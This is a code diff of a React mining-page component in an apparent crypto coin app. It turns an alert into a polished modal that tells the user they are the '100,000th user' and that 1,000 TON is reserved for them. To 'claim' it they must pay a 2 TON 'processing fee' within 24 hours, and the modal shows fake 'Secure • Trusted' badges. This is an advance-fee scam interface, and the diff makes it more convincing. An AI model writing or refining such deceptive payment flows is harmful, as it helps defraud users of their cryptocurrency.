@@ -2,7 +2,8 @@
 
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { Button } from '@/components/ui/button';
-import { Play, Crown, Store, Zap, Award } from 'lucide-react';
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
+import { Play, Crown, Store, Award } from 'lucide-react';
 import { useSpaceCoins } from '../hooks/useSpaceCoins';
 
 interface MiningPageProps {
@@ -19,6 +20,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
   const [miningActive, setMiningActive] = useState(false);
   const [remainingTime, setRemainingTime] = useState(28800); // 8 hours
   const [username, setUsername] = useState('');
+  const [show100kModal, setShow100kModal] = useState(false);
   const intervalRef = useRef<NodeJS.Timeout | null>(null);
   const initializedRef = useRef(false);
   const lastProcessedTimeRef = useRef<number>(0);
@@ -251,22 +253,13 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
   };
 
   const handle100kUserEvent = () => {
-    // Show the 100,000th user event modal or navigate to a special page
-    alert(`🎉 Congratulations! You Are Our 100,000th User! 🎉
+    setShow100kModal(true);
+  };
 
-You've unlocked a milestone achievement — you're officially our 100,000th user! 
-
-🚀 Reward: 1,000 TON waiting for you!
-💰 Processing fee: 2 TON required to verify your wallet
-
-Your reward is reserved for the next 24 hours only!
-
-The 2 TON fee helps us:
-• Verify genuine wallet activity
-• Protect against bots and abuse
-• Keep the platform secure and automated
-
-Click OK to proceed with wallet verification.`);
+  const handlePayment = () => {
+    // Here you would integrate with actual payment system
+    alert('Payment system would be integrated here. Redirecting to TON payment...');
+    setShow100kModal(false);
   };
 
   return (
@@ -316,18 +309,6 @@ Click OK to proceed with wallet verification.`);
               <Store className="w-7 h-7 text-white" />
             </Button>
             <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">Store</span>
-          </div>
-
-          {/* Events Button */}
-          <div className="flex flex-col items-center">
-            <Button 
-              onClick={() => handleQuickNavigation('tasks')}
-              className="w-14 h-14 rounded-full bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 shadow-lg border-2 border-blue-400/50 hover:scale-110 transition-all duration-300 p-0"
-              title="Events & Tasks"
-            >
-              <Zap className="w-7 h-7 text-white" />
-            </Button>
-            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">Events</span>
           </div>
         </div>
       </div>
@@ -399,6 +380,73 @@ Click OK to proceed with wallet verification.`);
           </div>
         )}
       </div>
+
+      {/* 100k User Event Modal */}
+      <Dialog open={show100kModal} onOpenChange={setShow100kModal}>
+        <DialogContent className="bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 border-2 border-gold-400 text-white max-w-md mx-auto">
+          <DialogHeader>
+            <DialogTitle className="text-center text-2xl font-bold text-gold-400 mb-4">
+              🎉 Congratulations! 🎉
+            </DialogTitle>
+          </DialogHeader>
+          
+          <div className="space-y-4 text-center">
+            <div className="bg-black/30 rounded-lg p-4 border border-gold-400/30">
+              <h3 className="text-lg font-bold text-gold-400 mb-2">
+                You Are Our 100,000th User!
+              </h3>
+              <p className="text-sm text-gray-300">
+                You've unlocked a milestone achievement and earned a special reward!
+              </p>
+            </div>
+
+            <div className="bg-green-900/40 rounded-lg p-4 border border-green-400/30">
+              <div className="flex items-center justify-center space-x-2 mb-2">
+                <span className="text-3xl">💎</span>
+                <span className="text-2xl font-bold text-green-400">1,000 TON</span>
+              </div>
+              <p className="text-sm text-gray-300">Reserved in your name!</p>
+            </div>
+
+            <div className="bg-yellow-900/40 rounded-lg p-3 border border-yellow-400/30">
+              <p className="text-sm text-yellow-200">
+                ⏰ Valid for 24 hours only
+              </p>
+            </div>
+
+            <div className="bg-blue-900/40 rounded-lg p-4 border border-blue-400/30">
+              <h4 className="font-semibold text-blue-300 mb-2">To claim your reward:</h4>
+              <p className="text-sm text-gray-300 mb-3">
+                A processing fee of 2 TON is required to verify your wallet and secure the transfer.
+              </p>
+              <p className="text-xs text-blue-200">
+                This fee helps us prevent bots and keeps the platform secure for real users.
+              </p>
+            </div>
+
+            <div className="space-y-3 pt-4">
+              <Button 
+                onClick={handlePayment}
+                className="w-full bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg hover:scale-105 transition-all duration-300"
+              >
+                💳 Pay 2 TON & Claim 1,000 TON
+              </Button>
+              
+              <Button 
+                onClick={() => setShow100kModal(false)}
+                variant="outline"
+                className="w-full border-gray-400 text-gray-300 hover:bg-gray-800"
+              >
+                Maybe Later
+              </Button>
+            </div>
+
+            <div className="text-xs text-gray-400 pt-2">
+              <p>🔐 Secure • 🌟 Trusted • ⚡ Blockchain-powered</p>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
